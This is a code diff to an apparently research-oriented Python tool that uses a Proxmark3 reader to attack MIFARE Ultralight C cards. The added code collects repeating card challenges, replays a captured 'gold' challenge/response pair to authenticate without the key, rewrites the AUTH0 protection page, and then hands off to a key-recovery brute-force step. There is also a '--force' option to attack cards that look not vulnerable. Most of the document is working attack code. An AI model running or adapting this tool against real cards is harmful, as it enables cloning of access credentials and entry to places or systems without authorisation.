@@ -13,7 +13,6 @@ import subprocess
 import argparse
 import random
 import sys
-import os
 import re
 import threading
 import time
@@ -233,7 +232,136 @@ class CrackEffect:
         scramble_thread.join()
 
 
-def collect(num_challenges: int, p, debug: bool, force:bool) -> Optional[dict]:
+def try_unlock(num_challenges: int, erndb: str, erndarndb: str, p) -> bool:
+    """Try to unlock the card by using the provided reader response
+
+    Args:
+        num_challenges (int): Number of challenge reads to attempt.
+        erndb (str): Card challenge to look for.
+        erndarndb (str): Reader response to use.
+        p: Proxmark3 instance used to issue raw commands and read responses.
+
+    Returns:
+        bool:
+            Success
+    """
+    challenges_collected = 0
+    next_progress = 10
+
+    print("[=] Waiting for the provided challenge to appear...")
+    while challenges_collected < max(1, num_challenges):
+        p.console("hf 14a raw -sck 1A00")
+        challenge = p.grabbed_output.split()
+        if (len(challenge) > 8) and (challenge[1] == "AF"):
+            hex_challenge = "".join(challenge[2:10]).upper()
+            # print(hex_challenge, erndb)
+            challenges_collected += 1
+            progress = challenges_collected * 100 // max(1, num_challenges)
+            if progress >= next_progress:
+                print(f"[=] Progress: {min(progress, 100)}%")
+                next_progress += 10
+            if hex_challenge == erndb:
+                p.console(f"hf 14a raw -ck AF{erndarndb}")
+                response = p.grabbed_output.split()
+                if (len(response) > 8) and (response[1] == "00"):
+                    print("[+] Unlock successful!")
+                    # Rewrite AUTH0
+                    p.console("hf 14a raw -c a2 2a 30000000")
+                    response = p.grabbed_output.split()
+                    if response[1] == "0A":
+                        print("[+] AUTH0 reset successful!")
+                        return True
+                    else:
+                        print("[-] AUTH0 reset failed")
+                        print(response)
+                        return False
+                else:
+                    print("[-] Unlock failed")
+                    p.console("hf 14a reader --drop", capture=False)
+                    return False
+        p.console("hf 14a reader --drop", capture=False)
+    print("[-] Provided challenge not found, try again")
+    return False
+
+
+def collect_100(num_challenges: int, p, early_stop: bool) -> tuple[int, dict]:
+    """Collect challenges and track the most frequent nonce occurrence.
+
+    Args:
+        num_challenges (int): Number of challenge reads to attempt.
+        p: Proxmark3 instance used to issue raw commands and read responses.
+        early_stop (bool): Stop as soon as a repeated challenge is detected.
+
+    Returns:
+        tuple[int, dict]:
+            - max_occurrence: Highest number of times any single challenge appeared.
+            - challenges: Collected challenge map including "challenge_100", set to the
+              most frequent challenge seen during collection.
+    """
+    # Collect challenges (100)
+    challenges_collected = 0
+    occurrences = {}
+    max_occurrence = 1
+    challenges = {}
+
+    while challenges_collected < max(1, num_challenges):
+        p.console("hf 14a raw -sc 1A00")
+        challenge = p.grabbed_output.split()
+        if (len(challenge) > 8) and (challenge[1] == "AF"):
+            hex_challenge = "".join(challenge[2:10])
+            if challenges_collected == 0:
+                challenges["challenge_100"] = hex_challenge
+            if hex_challenge in occurrences:
+                occurrences[hex_challenge] += 1
+                if occurrences[hex_challenge] > max_occurrence:
+                    max_occurrence = occurrences[hex_challenge]
+                    challenges["challenge_100"] = hex_challenge
+                if early_stop:
+                    break
+            else:
+                occurrences[hex_challenge] = 1
+            challenges_collected += 1
+
+    print("\n[+] 100 collection complete")
+    print(f"\r[+] Challenges collected: \033[96m{challenges_collected}\033[0m")
+    if max_occurrence > 1:
+        print("[+] Status: \033[1;31mVulnerable\033[0m\033[?25h")
+    else:
+        experimental_chals_subset_size = 600
+        probability_no_collision = 1.0
+        for i in range(challenges_collected):
+            probability_no_collision *= (experimental_chals_subset_size - i) / experimental_chals_subset_size
+        precision = max(1, -int(math.floor(math.log10(probability_no_collision))) + 1)
+        print("[+] Status: \033[1;32mNot vulnerable\033[0m"
+              f" (false negative probability: {probability_no_collision*100:.{precision-1}f}%)\033[?25h")
+    return max_occurrence, challenges
+
+
+def get_ulc_uid(p) -> Optional[str]:
+    """Check whether the card on the reader is a MIFARE Ultralight C.
+
+    Args:
+        p: Proxmark3 instance.
+
+    Returns:
+        tuple[bool, Optional[str]]:
+            - True and normalized UID (uppercase hex, no spaces) when detected.
+            - False and None otherwise.
+    """
+    # Sanity check: make sure an Ultralight C is on the Proxmark
+    p.console("hf 14a info")
+    info = p.grabbed_output
+    if "MIFARE Ultralight C" not in info:
+        print("[-] Error: \033[1;31mUltralight C not placed on Proxmark\033[0m")
+        return None
+    else:
+        print("[+] Ultralight C detected. Keep stable on Proxmark during the operations.")
+        uid_match = re.search(r"UID:\s*([0-9A-Fa-f ]+)", info)
+        uid = "".join(uid_match.group(1).split()).upper() if uid_match else None
+        return uid
+
+
+def collect(num_challenges: int, p, debug: bool, force: bool = False, erndarndb: Optional[str] = None) -> Optional[dict]:
     """
     Collect challenges from the card and check if it is vulnerable.
 
@@ -246,68 +374,36 @@ def collect(num_challenges: int, p, debug: bool, force:bool) -> Optional[dict]:
     Returns:
         Optional[dict]: Collected challenges data or None if the card is not vulnerable.
     """
-    # Sanity check: make sure an Ultralight C is on the Proxmark
-    p.console("hf 14a info")
-    if "MIFARE Ultralight C" not in p.grabbed_output:
-        print("[-] Error: \033[1;31mUltralight C not placed on Proxmark\033[0m")
+
+    uid = get_ulc_uid(p)
+    if uid is None:
         return
-    else:
-        print("[+] Ultralight C detected. Keep stable on Proxmark during the attack.")
 
     # Sanity check: ensure card is unlocked and lock bytes do not prevent key overwrite
     p.console("hf 14a raw -sc 3028")
     hex_bytes = p.grabbed_output.split()
     if len(hex_bytes) < 16:
-        print("[-] Error: \033[1;31mCard not unlocked. Run relay attack in UNLOCK mode first.\033[0m")
+        print("[-] Error: \033[1;31mCard not unlocked. See --get_frequent_chal and --unlock.\033[0m")
         return
     data_bytes = [bytes.fromhex(b) for b in hex_bytes[1:17]]
-    # Byte 0 of page 42: 0x30 minimum
-    minimum_auth_page = ord(data_bytes[8])
-    if minimum_auth_page < 48:
-        print("[-] Error: \033[1;31mCard not unlocked. Run relay attack in UNLOCK mode first.\033[0m")
-        return
     # First bit of byte 1 in page 40: lock key
     is_locked_key = ((ord(data_bytes[1]) & 0x80) >> 7) == 1
     if is_locked_key:
-        print("[-] Error: \033[1;31mCard is not vulnerable (see READ mode in relay app)\033[0m")
+        print("[-] Error: \033[1;31mCard OTP prevents key overwrite."
+              " Card is not vulnerable (see READ mode in relay app)"
+              " unless it's a Giantec (see tearing OTP)\033[0m")
+        return
+    # Byte 0 of page 42: 0x30 minimum
+    minimum_auth_page = ord(data_bytes[8])
+    if minimum_auth_page < 48:
+        print("[-] Error: \033[1;31mCard not unlocked. See --get_frequent_chal and --unlock.\033[0m")
         return
 
     print("[+] All sanity checks \033[1;32mpassed\033[0m. Checking if card is vulnerable.\033[?25l")
 
-    # Collect challenges (100)
-    challenges_collected = 0
-    challenges_100 = set()
-    challenges = {}
-    collision = False
-
-    while challenges_collected < max(1, num_challenges):
-        p.console("hf 14a raw -sc 1A00")
-        challenge = p.grabbed_output.split()
-        if (len(challenge) > 8) and (challenge[1] == "AF"):
-            hex_challenge = "".join(challenge[2:10])
-            if challenges_collected == 0:
-                challenges["challenge_100"] = hex_challenge
-            if hex_challenge in challenges_100:
-                collision = True
-                break
-            else:
-                challenges_100.add(hex_challenge)
-            challenges_collected += 1
-
-    print("\n[+] 100 collection complete")
-    print(f"\r[+] Challenges collected: \033[96m{challenges_collected}\033[0m")
-    if collision:
-        print("[+] Status: \033[1;31mVulnerable\033[0m\033[?25h")
-    else:
-        experimental_chals_subset_size = 600
-        probability_no_collision = 1.0
-        for i in range(challenges_collected):
-            probability_no_collision *= (experimental_chals_subset_size - i) / experimental_chals_subset_size
-        precision = max(1, -int(math.floor(math.log10(probability_no_collision))) + 1)
-        print("[+] Status: \033[1;32mNot vulnerable\033[0m"
-              f" (false negative probability: {probability_no_collision*100:.{precision-1}f}%)\033[?25h")
-        if not force:
-            return
+    max_occurrence, challenges = collect_100(num_challenges, p, early_stop=True)
+    if max_occurrence <= 1 and not force:
+        return
 
     # The card is vulnerable, proceed with attack
     # Danger zone. To reset a test card, run: hf mfu setkey -k 49454D4B41455242214E4143554F5946
@@ -408,18 +504,50 @@ def main():
                         help='Use CUDA implementation')
     parser.add_argument('--force', action='store_true',
                         help='Force the attack even if the card does not appear vulnerable (dangerous!)')
+    parser.add_argument('--get_frequent_chal', action='store_true',
+                        help='Collect a "gold" challenge to perform an unlock, and quit afterwards')
+    parser.add_argument('--unlock', help='Unlock a card with a "gold" challenge/response pair',
+                        type=str, metavar='ERndB,ERndARndB\'')
     args = parser.parse_args()
     debug = args.debug
     num_challenges = args.challenges
     offline = args.offline
     use_cuda = args.cuda
     force = args.force
+    get_frequent_chal = args.get_frequent_chal
+    erndb, erndarndb = args.unlock.split(',') if args.unlock else (None, None)
     brute_tool = tools["mfulc_des_brute_cuda"] if use_cuda else tools["mfulc_des_brute"]
+
+    if get_frequent_chal and (offline or args.json or force or use_cuda):
+        print("[-] Error: --get_frequent_chal can only be combined with --challenges")
+        return
+
+    if (erndb or erndarndb) and offline:
+        print("[-] Error: --unlock can'n be combined with --offline")
+        return
+
+    if get_frequent_chal:
+        import pm3
+        p = pm3.pm3()
+        uid = get_ulc_uid(p)
+        if uid is None:
+            return
+        max_occurrence, challenges = collect_100(num_challenges, p, early_stop=False)
+        print(f"[+] Most frequent challenge: \033[1;34m{challenges['challenge_100']}\033[0m"
+              f" (occurrences: {max_occurrence}/{num_challenges})")
+        print("[+] Get the corresponding reader response with")
+        print(f"[+] \033[1;33mhf mfu sim -t 13 -u {uid} --1a1 {challenges['challenge_100']}\033[0m")
+        return
 
     if not offline:
         import pm3
         p = pm3.pm3()
-        challenges = collect(num_challenges, p, debug, force)
+        if erndb and erndarndb:
+            erndb = erndb.upper()
+            erndarndb = erndarndb.upper()
+            if not try_unlock(num_challenges, erndb, erndarndb, p):
+                return
+        challenges = collect(num_challenges, p, debug, force, erndarndb)
         if challenges is None:
             return
         if args.json:
